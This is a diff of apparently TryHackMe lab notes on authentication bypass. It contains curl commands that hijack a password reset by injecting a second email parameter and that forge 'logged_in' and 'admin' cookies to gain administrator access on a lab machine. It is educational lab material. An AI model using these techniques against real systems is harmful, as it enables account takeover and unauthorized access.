@@ -54,9 +54,23 @@ curl 'http://10.10.115.78/customers/reset?email=robert%40acmeitsupport.thm' -H '
 ````
 curl 'http://10.10.115.78/customers/reset?email=robert@acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email={username}@customer.acmeitsupport.thm'
 ````
-
-
-
+## Cookie Tampering 
+- Decode the stored cookies and see if you can manipulate them before making curl requests with the new tampered cookies.
+- First, we'll start just by requesting the target page:
+````
+curl http://MACHINE_IP/cookie-test
+````
+- We can see we are returned a message of: Not Logged In
+- Now we'll send another request with the logged_in cookie set to true and the admin cookie set to false:
+````
+curl -H "Cookie: logged_in=true; admin=false" http://MACHINE_IP/cookie-test
+````
+- We are given the message: Logged In As A User
+- Finally, we'll send one last request setting both the logged_in and admin cookie to true:
+````
+curl -H "Cookie: logged_in=true; admin=true" http://MACHINE_IP/cookie-test
+````
+- This returns the result: Logged In As An Admin
 
 
 
